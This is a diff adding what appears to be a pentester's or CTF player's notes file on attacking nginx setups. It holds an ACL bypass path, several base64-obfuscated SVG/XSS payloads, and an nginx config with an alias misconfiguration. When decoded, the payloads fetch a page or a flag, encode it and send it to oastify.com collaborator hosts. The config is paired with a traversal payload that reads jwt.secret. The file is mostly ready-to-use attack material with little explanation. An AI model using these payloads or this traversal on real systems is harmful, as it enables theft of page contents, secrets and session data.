@@ -1,0 +1,56 @@
+Hacktricks:
+    - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx
+
+
+403 bypass:
+https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-php-fpm-integration
+
+/info.php/lol.php bypassed nginx misconfiguration
+
+%3Csvg%0Conload%3D%22eval%28atob%28%27ZmV0Y2goJ2luZm8ucGhwJykudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpLnRoZW4odGV4dCA9PiB7Y29uc3QgZW5jb2RlZERhdGEgPSBidG9hKHRleHQpLnJlcGxhY2UoL1wrL2csICctJykucmVwbGFjZSgvXC8vZywgJ18nKS5yZXBsYWNlKC89KyQvLCAnJyk7cmV0dXJuIGZldGNoKGBodHRwOi8vbzV1enA1ZXJxNGY2dGF5eTJ0MDVwczU2NXhib3pmMjNyLm9hc3RpZnkuY29tLz9kYXRhPSR7ZW5jb2RlZERhdGF9YCk7fSkudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpLnRoZW4ocmVzdWx0ID0%2BIGNvbnNvbGUubG9nKHJlc3VsdCkpOw%3D%3D%27%29%29%3B%22%3E
+
+"eval(atob('ZmV0Y2goJ2luZm8ucGhwL2luZGV4LnBocCcpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKHRleHQgPT4ge2xldCBmbGFnID10ZXh0LnNwbGl0KCdGTEFHPScpWzFdPy5zcGxpdCgnPCcpWzBdO2lmIChmbGFnKSB7bGV0IGVuY29kZWREYXRhID0gYnRvYShmbGFnKTtmZXRjaChgaHR0cDovLzE1NGNwaWU0cWhmanRueWIyNjBpcDU1ajVhYjF6dHRoaS5vYXN0aWZ5LmNvbS8ke2VuY29kZWREYXRhfWApO31lbHNle2xldCBlbmNvZGVkRGF0YSA9IGJ0b2EoIkZMQUcgbm90IGZvdW5kIik7ZmV0Y2goYGh0dHA6Ly8xNTRjcGllNHFoZmp0bnliMjYwaXA1NWo1YWIxenR0aGkub2FzdGlmeS5jb20vJHtlbmNvZGVkRGF0YX1gKTt9fSk7'));"
+
+%3Csvg%0Conload%3D%22eval%28atob%28%27ZmV0Y2goJ2luZm8ucGhwL2luZGV4LnBocCcpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKHRleHQgPT4ge2xldCBmbGFnID10ZXh0LnNwbGl0KCdGTEFHPScpWzFdPy5zcGxpdCgnPCcpWzBdO2lmIChmbGFnKSB7bGV0IGVuY29kZWREYXRhID0gYnRvYShmbGFnKTtmZXRjaChgaHR0cDovLzE1NGNwaWU0cWhmanRueWIyNjBpcDU1ajVhYjF6dHRoaS5vYXN0aWZ5LmNvbS8ke2VuY29kZWREYXRhfWApO31lbHNle2xldCBlbmNvZGVkRGF0YSA9IGJ0b2EoIkZMQUcgbm90IGZvdW5kIik7ZmV0Y2goYGh0dHA6Ly8xNTRjcGllNHFoZmp0bnliMjYwaXA1NWo1YWIxenR0aGkub2FzdGlmeS5jb20vJHtlbmNvZGVkRGF0YX1gKTt9fSk7%27%29%29%3B%22%3E
+
+
+
+
+Alias vulnerability:
+
+user  nobody;
+worker_processes  auto;
+
+events {
+    worker_connections  1024;
+}
+
+
+http {
+    include       mime.types;
+    default_type  application/octet-stream;
+
+    sendfile        on;
+    keepalive_timeout  65;
+
+    server {
+        listen       80;
+        server_name  localhost;
+        location / {
+            proxy_pass http://localhost:8000;
+        }
+        location /static {
+            alias /app/static/;
+        }
+        error_page   500 502 503 504  /50x.html;
+        location = /50x.html {
+            root   html;
+        }
+
+    }
+
+}
+
+
+Payload:
+/static../jwt.secret -> /app/static/../jwt.secret
